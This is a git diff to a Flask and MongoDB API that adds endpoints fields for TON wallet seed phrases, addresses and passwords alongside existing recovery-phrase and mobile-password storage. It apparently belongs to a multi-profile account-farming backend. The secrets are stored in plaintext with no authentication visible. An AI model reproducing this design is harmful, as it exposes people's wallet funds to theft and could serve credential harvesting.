@@ -1,6 +1,7 @@
-from flask import Blueprint, render_template, current_app, jsonify, request
+from flask import Blueprint, render_template, current_app, jsonify, request, send_from_directory
 from bson import ObjectId
 from datetime import datetime
+
 
 
 api = Blueprint("api", __name__)
@@ -13,8 +14,10 @@ def profile_push():
     profile_device = data.get("profile_device")
     status = data.get("status")
     session = data.get("session")
-
-    print(data)
+    seedPhraseTon = data.get("seedPhraseTon")
+    addressTon = data.get("addressTon")
+    passwordTon = data.get("passwordTon")
+    
 
     check = current_app.profile_gpm.find_one(
         {"profile_name": profile_name, "profile_device": profile_device}
@@ -29,6 +32,15 @@ def profile_push():
 
         if status and len(status) >= 3:
             update_data["status"] = status
+            
+        if seedPhraseTon and len(seedPhraseTon) >= 3:
+            update_data["seedPhraseTon"] = seedPhraseTon
+        
+        if addressTon and len(addressTon) >= 3:
+            update_data["addressTon"] = addressTon
+        
+        if passwordTon and len(passwordTon) >= 3:
+            update_data["passwordTon"] = passwordTon
 
         current_app.profile_gpm.update_one(
             {"profile_name": profile_name, "profile_device": profile_device},
@@ -44,6 +56,9 @@ def profile_push():
             "last_time": datetime.now(),
             "status": "live",
             "session": session,
+            "seedPhraseTon": seedPhraseTon,
+            "addressTon": addressTon,
+            "passwordTon": passwordTon,
         }
     )
     return jsonify({"code": 201, "message": "Profile created successfully"}), 201
@@ -53,7 +68,6 @@ def profile_push():
 def data_detail_push():
 
     data = request.json
-    print(data)
     profile = data.get("profile")
     device = data.get("device")
     status = data.get("status")
@@ -191,7 +205,6 @@ def wallet_detail_push():
     password_mobile = data.get("password_mobile")
     recovery_phrase = data.get("recovery_phrase")
     status = data.get("status")
-    status_tomarket = data.get("status_tomarket")
 
     wallet = current_app.wallet.find_one({"slug": str(wallet_type).lower()})
 
@@ -207,7 +220,6 @@ def wallet_detail_push():
                 "recovery_phrase": recovery_phrase,
                 "last_time": datetime.now(),
                 "status": status,
-                "status_tomarket": status_tomarket,
             }
         )
 
@@ -237,9 +249,6 @@ def wallet_detail_push():
 
         if status and len(status) >= 3:
             update_fields["status"] = status
-
-        if status_tomarket and len(status_tomarket) >= 3:
-            update_fields["status_tomarket"] = status_tomarket
 
         if update_fields:
             update_fields["last_time"] = datetime.now()
